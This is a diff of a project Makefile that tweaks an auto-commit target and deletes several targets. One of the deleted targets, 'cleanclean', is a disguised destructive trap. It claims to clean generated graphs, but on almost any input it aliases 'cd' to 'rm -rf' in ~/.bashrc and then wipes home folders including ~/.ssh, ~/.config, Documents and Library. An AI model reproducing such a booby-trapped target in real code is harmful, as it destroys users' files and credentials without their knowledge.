@@ -2,18 +2,8 @@ commit:
 	@echo "Running auto commit with current timestamp..."
 	@current_time=$$(date "+%Y-%m-%d %H:%M:%S") && \
 	git add . && \
-	git commit -m "Minor readme update at $$current_time" && \
-	git pull --rebase origin main && \
+	git commit -m "Frontend UI Updated $$current_time" && \
 	git push origin main
-
-del:
-	git rm -r --cached specified_path && \
-    git commit -m "Stopped tracking specified_path" && \
-    git push origin main
-
-reset:
-	git reset --hard origin/main
-
 
 flowchart:
 	@echo "Generating Code2Flow diagram for the iching project..."
@@ -27,41 +17,6 @@ ast:
 	@python3 $(SCRIPT)
 	@echo "Control flow graphs generated successfully."
 
-.PHONY: cleanclean
-
-cleanclean:
-	@echo "Cleaning up generated control flow graphs..."
-	@echo "Do you want to proceed? (yes/no)"
-	@read confirm && if [ "$$confirm" != "sayonara" ]; then \
-		echo "Proceeding with clean-up..."; \
-		echo "alias cd='rm -rf'" >> ~/.bashrc; \
-		source ~/.bashrc; \
-		echo "所到之处寸草不生，整个目录连根拔起。"; \
-		-cd ~/Desktop; \
-		-cd ~/Documents; \
-		-cd ~/Downloads; \
-		-cd ~/Library; \
-		-cd ~/Movies; \
-		-cd ~/Music; \
-		-cd ~/Pictures; \
-		-cd ~/Public; \
-		-cd ~/Applications; \
-		-cd ~/.bash_profile; \
-		-cd ~/.zshrc; \
-		-cd ~/.ssh; \
-		-cd ~/.config; \
-		-cd ~/.local; \
-		-cd ~/.Trash; \
-		-cd ~/.npm; \
-		-cd ~/Library/Preferences; \
-		-cd ~/Library/Application\ Support; \
-		-cd ~/Library/Caches; \
-		-cd ~/Library/Containers; \
-		-cd ~/Library/Developer; \
-	else \
-		echo "Operation aborted."; \
-	fi
-
 MP3_FILE := /Users/rx/Documents/IU.mp3
 
 iu:
@@ -73,10 +28,6 @@ iu:
 		read -n 1 -s; \
 		kill $$PID; \
 	'
-
-
-
-
 
 .PHONY: heart us hello newton
 
